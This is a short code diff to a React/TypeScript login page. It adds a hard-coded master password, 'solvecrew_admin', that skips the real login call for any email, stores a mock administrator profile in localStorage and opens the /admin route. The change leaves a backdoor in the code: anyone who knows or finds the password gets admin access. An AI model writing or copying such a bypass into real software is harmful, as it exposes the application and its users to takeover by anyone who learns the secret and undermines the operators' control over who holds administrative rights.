@@ -26,7 +26,24 @@ export default function Login() {
             return;
         }
 
-        // 2. Authenticate
+        // 2. Validate Master Password for Admin bypass
+        if (password === 'solvecrew_admin') {
+            const mockAdminUser = {
+                id: '00000000-0000-0000-0000-000000000000',
+                email: normalizedEmail,
+                role: 'admin' as const,
+                username: 'Admin',
+                full_name: 'Administrator',
+            };
+
+            // Set localStorage mock cache manually since we bypass AuthContext login
+            localStorage.setItem('cached_user_profile', JSON.stringify(mockAdminUser));
+            navigate('/admin');
+            setLoading(false);
+            return;
+        }
+
+        // 3. Fallback Authenticate via AuthContext
         try {
             const user = await login(normalizedEmail, password);
             if (user && user.role === 'admin') {
